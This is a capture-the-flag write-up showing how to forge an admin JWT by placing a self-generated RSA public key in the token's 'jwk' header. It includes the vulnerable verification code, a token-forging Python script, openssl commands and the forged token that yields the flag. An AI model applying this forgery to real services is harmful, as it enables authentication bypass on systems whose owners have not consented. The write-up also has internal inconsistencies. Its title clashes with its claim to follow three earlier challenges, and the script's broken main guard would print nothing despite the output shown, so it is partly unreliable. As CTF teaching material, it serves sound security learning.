# JWT Gauntlet 2 Writeup

### Disclaimer
This challenge is a sequal to `JWT Gauntlet 1`, `JWT Gauntlet 2`, and `JWT Gauntlet 3` so this writeup will assume you have read the previous writeups.

### Writeup

This challenge starts just like the other three, the website looks the exact same, but the description mentioned using `Web Keys` this time, possibly alluding to a `jwk` or `Json Web Key`, this would be a part of the JWT header that directly specifies the public key to verify with.

Looking at the session cookie:
```txt
session: eyJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImtpZCI6IjkwNzgxNyIsImt0eSI6IlJTQSIsIm4iOiJubWZaeUJseENrcEI5NDEvZ1l2RFlNdDU5dGhLSlEra0p2bk90Y0ZSMkZzT1gxNWhXK3pYVVhYUnh4dUMzdTNudFNzMkxGakIrNWZjSzlnNGlUdXl4ZzJmakx4QXRLMWszM2FPOXEzNkZyTnNIdXY0KzhSblVDQjFhaDJBZzQ1NXFKZlROR0tCa2t4aElFUjRsaWJJK0kvdkxiSkJWNmdxOWpFS2d5VjlNMS94NGN6ZEl6QURhcW51QTZPeUxsU0c0RkFwbVVtMFI0YUtwejcxZnhqeG01NE0yc0RkdHVYVnpySUtSRkphWEZRc3BBeGR1MWFuNitnYkJJaDMreE1YREpQeEFRdGRENjRaWkpNa3BjWW0ycGM5U3h1TWgvSWxsQnVqVlFWK2dnTWkxQW5qdW5POTFBQkg5Tzh2TDNCVmpWcUpJQnB3N2RSMFBzaFIzWWZkUlEifSwia2lkIjoiOTA3ODE3IiwidHlwIjoiSldUIn0.eyJhZG1pbiI6ZmFsc2UsImF1ZCI6ImlzX2FkbWluIn0.i7CliQ7xdudl1L1op-tfGJRR9nLJQA2F_RcmrbEBPxS7FUG652OFzOQEWAyX0bXLkfzn6dJUl-Bbf43X1nktw7oOiQEznHTvVtjw4I4cneCEqfbd8KN-Jscl3brXotUrmdGgvTo_XLU2a8nP5WhwLfLx23P9NaY1PdwgzrhEwCH-OuZw20EDjgDVFc7vfTP2DmYg7XkiNsG7JuWeN3C0oyWVyrpCL2_O1zbfNaPDpHtLV-fj7J8055dDGXvyBOPKIHpAizqmhmrHDdZh-MG0dllmzS9YrX0F1qzJm5paLQd7PG7px7wwkDCjds0ATuZxmFDQjLp9aGPVuSSWBC-iOA
```

Throwing this into `jwt.io` decodes it into:
```json
{
  "alg": "RS256",
  "jwk": {
    "e": "AQAB",
    "kid": "907817",
    "kty": "RSA",
    "n": "nmfZyBlxCkpB941/gYvDYMt59thKJQ+kJvnOtcFR2FsOX15hW+zXUXXRxxuC3u3ntSs2LFjB+5fcK9g4iTuyxg2fjLxAtK1k33aO9q36FrNsHuv4+8RnUCB1ah2Ag455qJfTNGKBkkxhIER4libI+I/vLbJBV6gq9jEKgyV9M1/x4czdIzADaqnuA6OyLlSG4FApmUm0R4aKpz71fxjxm54M2sDdtuXVzrIKRFJaXFQspAxdu1an6+gbBIh3+xMXDJPxAQtdD64ZZJMkpcYm2pc9SxuMh/IllBujVQV+ggMi1AnjunO91ABH9O8vL3BVjVqJIBpw7dR0PshR3YfdRQ"
  },
  "kid": "907817",
  "typ": "JWT"
}
{
  "admin": false,
  "aud": "is_admin"
}
```

This shows some new things, first that we are indeed dealing with a `jwk`, which specifies that the algorithm used (`kty`) is `RSA`, that the `e` value of this key is `AQAB` which is a base64 encoded integer, namely `65537`, and the `n` value for the RSA public key. 
Next, there is also a new value in the body `aud`, this is short for audience, and is used to ensure that only JWT tokens designed for a certain interface are read by that interface, they are not for security reasons and as such will not get in our way.

Looking at the source code which is ofcourse at `/app.pyi` just like in the last three challenges. The new `is_admin` code is as follows:

```python
def is_admin(request) -> bool:
    token = request.cookies.get("session")
    if token is None:
        return False

    try:
        header = jwt.get_unverified_header(token)
        jwk = jwt.PyJWK(header["jwk"])
        kid = header["kid"]

        if kid == jwk.key_id:
            key = jwk.key
        else:
            return False

        data = jwt.decode(token, key, algorithms=["RS256"], audience="is_admin")
        return data.get("admin", False)
    except Exception as e:
        return False
```

This shows that we need a `kid` value in the header and the `jwk` so that we use it, and the `aud` payload is needed, along with the algorithm being hardcoded to `RS256`, so we need to implement our own RS256 JWT signing and the pass it over with a `jwk`.

Luckily the source code has its own implementation of creating the JWT token, that we can co-opt

```python
import base64
import random

import jwt
from cryptography.hazmat.primitives import serialization

def b64_uint(n: int) -> str:
    byte_length = (n.bit_length() + 7) // 8
    return base64.b64encode(n.to_bytes(byte_length, "big")).rstrip(b"=").decode()

def create_token():
    payload = {"admin": False, "aud": "is_admin"}
    secret_key_path = "priv.key"
    with open(secret_key_path, "r") as f:
        key = f.read().strip()

    public_key_path = "pub.key"
    with open(public_key_path, "rb") as f:
        pub_key = serialization.load_pem_public_key(f.read().strip())

    numbers = pub_key.public_numbers()

    N = numbers.n
    e = numbers.e

    kid = str(random.randint(100000, 999999))

    token = jwt.encode(
        payload,
        key,
        algorithm="RS256",
        headers={
            "kid": kid,
            "jwk": {
                "kty": "RSA",
                "e": b64_uint(e),
                "kid": kid,
                "n": b64_uint(N),
            },
        },
    )
    return token
```

All we need to do is change the default value for `admin` to `true`, and then create out own RS256 public and private key in files called `pub.key` and `priv.key` respectively.

```python
def b64_uint(n: int) -> str:
    byte_length = (n.bit_length() + 7) // 8
    return base64.b64encode(n.to_bytes(byte_length, "big")).rstrip(b"=").decode()

def create_token():
    payload = {"admin": True, "aud": "is_admin"}
    secret_key_path = "priv.key"
    with open(secret_key_path, "r") as f:
        key = f.read().strip()

    public_key_path = "pub.key"
    with open(public_key_path, "rb") as f:
        pub_key = serialization.load_pem_public_key(f.read().strip())

    numbers = pub_key.public_numbers()

    N = numbers.n
    e = numbers.e

    kid = str(random.randint(100000, 999999))

    token = jwt.encode(
        payload,
        key,
        algorithm="RS256",
        headers={
            "kid": kid,
            "jwk": {
                "kty": "RSA",
                "e": b64_uint(e),
                "kid": kid,
                "n": b64_uint(N),
            },
        },
    )
    return token
    
if __name__ == "__name__":
    print(create_token())
```

The commands needed to generate a `RS256` private-public key pair are:
```bash
$ openssl genrsa -out priv.key 2048
$ openssl rsa -pubout -in priv.key -out pub.key
writing RSA key
$ ls
generator.py  priv.key  pub.key
$ cat pub.key 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkqYZ3IeXCQzAtym5Vi9D
JfQVGYCb+SzqpLPuD9NKJ/0cyL5W1bXxBc7EMrQtnJIU2gtgpbmirXTnzHiaUki5
dpawST5IsdmydWMBBlUuP8M8xu07MaaqlX9P0LXtdk18TMmdYBzyXoV+OhoAeHTg
Dz6+W2XY+haP5iRsw/wrqjzxWuzC+SUrASPzJPVLvq4I7PjDwVlUHY/d4r4c+FN/
L26rUTyAfBMo/fX2aMhy4TMtjj5PSAztNJfrLmHat0P7qg8kHxaFRGWQvnt87vdH
KqnxRIUZYXxECTEaMZ3dDmI+vmovVTniOoguTt8ztakWCuxEg61CxulWFH5j7Kkq
awIDAQAB
-----END PUBLIC KEY-----
```

Then we just make a venv, install the neccessary packages, and run the script

```bash
$ python3 -m venv jwt
$ ls
generator.py  jwt  priv.key  pub.key

$ source jwt/bin/activate
(jwt) $ pip install PyJwt
Collecting PyJwt
  Downloading PyJWT-2.10.1-py3-none-any.whl.metadata (4.0 kB)
Downloading PyJWT-2.10.1-py3-none-any.whl (22 kB)
Installing collected packages: PyJwt
Successfully installed PyJwt-2.10.1

(jwt)$ pip install cryptography
Collecting cryptography
  Downloading cryptography-46.0.3-cp311-abi3-manylinux_2_34_x86_64.whl.metadata (5.7 kB)
Collecting cffi>=2.0.0 (from cryptography)
  Downloading cffi-2.0.0-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.6 kB)
Collecting pycparser (from cffi>=2.0.0->cryptography)
  Downloading pycparser-2.23-py3-none-any.whl.metadata (993 bytes)
Downloading cryptography-46.0.3-cp311-abi3-manylinux_2_34_x86_64.whl (4.5 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.5/4.5 MB 21.9 MB/s eta 0:00:00
Downloading cffi-2.0.0-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (219 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 219.6/219.6 kB 15.6 MB/s eta 0:00:00
Downloading pycparser-2.23-py3-none-any.whl (118 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 118.1/118.1 kB 16.7 MB/s eta 0:00:00
Installing collected packages: pycparser, cffi, cryptography
Successfully installed cffi-2.0.0 cryptography-46.0.3 pycparser-2.23

(jwt)$ python3 generator.py 
eyJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImtpZCI6IjMxMjYwNCIsImt0eSI6IlJTQSIsIm4iOiJrcVlaM0llWENRekF0eW01Vmk5REpmUVZHWUNiK1N6cXBMUHVEOU5LSi8wY3lMNVcxYlh4QmM3RU1yUXRuSklVMmd0Z3BibWlyWFRuekhpYVVraTVkcGF3U1Q1SXNkbXlkV01CQmxVdVA4TTh4dTA3TWFhcWxYOVAwTFh0ZGsxOFRNbWRZQnp5WG9WK09ob0FlSFRnRHo2K1cyWFkraGFQNWlSc3cvd3Jxanp4V3V6QytTVXJBU1B6SlBWTHZxNEk3UGpEd1ZsVUhZL2Q0cjRjK0ZOL0wyNnJVVHlBZkJNby9mWDJhTWh5NFRNdGpqNVBTQXp0TkpmckxtSGF0MFA3cWc4a0h4YUZSR1dRdm50ODd2ZEhLcW54UklVWllYeEVDVEVhTVozZERtSSt2bW92VlRuaU9vZ3VUdDh6dGFrV0N1eEVnNjFDeHVsV0ZINWo3S2txYXcifSwia2lkIjoiMzEyNjA0IiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZSwiYXVkIjoiaXNfYWRtaW4ifQ.f_jV-qKSrl0B9z2D0HU_y0la2uPQoiwLJWmd9o8juiW8pYKovqyKjFO35cbbg2ZcRx3qPDJrl_KJ3RdKTeeMm_s8eqsDrtRsWfHJhamq8xO5sclXjQJhh3-4cs-HHdgp5l_oWVJdeB-zliLgb9dnjyStB_tzuNfNWxGUMuEVqyosZBu5QybqUkqeubP6xMrUL6dOW8wLwIna7qIn9L4fd5QbM5YTNYEAskQ95_zfXxvLgqw1rTWt3QsMguTdMXtD_YV4428AULRSxiDZIgr2vOEXlnbTny1wdUe31J5-pJcQCMH2jBoR568asND7BHpkvMKrTvglBbJ1WR2PRdwh_Q
```

We can then change our cookie to this new token, and reload the page. This adds the `Admin` button to our navbar and pressing it links to the flag page:
```txt
redroomctf{Wh4t_d0_y0u_m34n_J50n_W3b_K3y5_5h0u7nt_b3_tru5t3d}
```
